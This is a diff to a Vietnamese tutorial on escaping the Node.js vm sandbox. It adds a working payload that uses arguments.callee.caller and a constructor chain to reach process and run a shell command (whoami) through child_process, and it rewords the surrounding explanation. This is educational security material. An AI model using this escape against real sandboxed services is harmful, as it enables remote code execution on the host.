@@ -92,7 +92,8 @@ console.log(sandbox); // { test: 12 }
 `vm.Script` là một lớp trong Node.js cho phép bạn biên dịch và chạy đoạn mã JavaScript trong một ngữ cảnh cụ thể. Các đối tượng của lớp vm.Script chứa các đoạn mã đã được biên dịch trước và có thể được thực thi nhiều lần trong một hoặc nhiều sandbox.
 
 `script` có thể được chạy thông qua `runInNewContext`
-Thường khi thực hiện thoát khỏi sandbox, chúng ta sẽ thực hiện RCE (Remote Code Execution). Trong NodeJS, để thực hiện RCE, chúng ta cần sử dụng đối tượng process. Sau khi có được đối tượng process, chúng ta có thể sử dụng require để nhập child_process và sau đó sử dụng child_process để thực thi các lệnh. Tuy nhiên, process được gắn kết vào global, nhưng như chúng ta đã nói ở trên, sau khi tạo một ngữ cảnh mới (createContext), không thể truy cập được đến global. Vì vậy, mục tiêu cuối cùng của chúng ta là thông qua các phương tiện khác nhau để đưa đối tượng process được gắn kết trên global vào trong môi trường sandbox.
+
+Khi thực hiện thoát khỏi sandbox, mục tiêu thường là thực hiện RCE (Remote Code Execution). Trong Node.js, để thực hiện RCE, chúng ta cần truy cập vào đối tượng `process`. Một khi đã có được đối tượng `process`, chúng ta có thể sử dụng `require` để nhập `child_process` và sau đó dùng `child_process` để thực thi các lệnh hệ thống. Mặc dù đối tượng `process` được gắn vào `global`, khi tạo một ngữ cảnh mới (sử dụng `createContext`), đối tượng `global` không còn có thể truy cập được. Vì vậy, mục tiêu cuối cùng là tìm cách đưa đối tượng `process` từ `global` vào môi trường sandbox.
 
 ```js
 const vm = require("vm");
@@ -122,15 +123,29 @@ Một số trường hợp khác
 
 ```js
 const vm = require('vm');
-const script = `???`;
+
+const script = `(() => {
+  const a = {};
+  a.toString = function () {
+    const cc = arguments.callee.caller;
+    const p = (cc.constructor.constructor('return process'))();
+    return p.mainModule.require('child_process').execSync('whoami').toString();
+  };
+  return a;
+})()`;
+
 const sandbox = Object.create(null);
-const context = vm.createContext(sandbox);
+const context = new vm.createContext(sandbox);
 const res = vm.runInContext(script, context);
-console.log(res)
+console.log('Hello ' + res);
 
 ```
 
-Lúc này this đang là null và không có đối tượng nào khác có thể được tham chiếu, chúng ta cần sử dụng một thuộc tính nội tại của đối tượng hàm, đó là arguments.callee.caller. Thuộc tính này có thể trả về người gọi của hàm. Trong trường hợp này, việc sandbox escape thực chất là tìm một đối tượng bên ngoài môi trường cát và gọi một trong các phương thức của nó. Trong trường hợp này, chúng ta chỉ cần định nghĩa một hàm trong sandbox, sau đó gọi hàm đó từ bên ngoài sandbox. Khi hàm trong sandbox được gọi, arguments.callee.caller sẽ trả về một đối tượng bên ngoài sandbox. Từ đó, chúng ta có thể thực hiện vm sandbox escape
+
+Khi this đang là null và không có đối tượng nào khác để tham chiếu, chúng ta có thể tận dụng thuộc tính nội tại của đối tượng hàm, cụ thể là `arguments.callee.caller`. Thuộc tính này cho phép chúng ta xác định hàm nào đã gọi hàm hiện tại.
+
+Trong tình huống này, việc thoát khỏi sandbox (sandbox escape) thực chất là tìm một đối tượng bên ngoài môi trường sandbox và gọi một trong các phương thức của nó. Cách thực hiện là định nghĩa một hàm trong sandbox, sau đó gọi hàm đó từ bên ngoài sandbox. Khi hàm trong sandbox được gọi, thuộc tính `arguments.callee.caller` sẽ trả về đối tượng hàm từ bên ngoài sandbox. Từ đó, chúng ta có thể khai thác để thực hiện việc thoát khỏi môi trường sandbox.
+
 
 Giải thích đơn giản
 
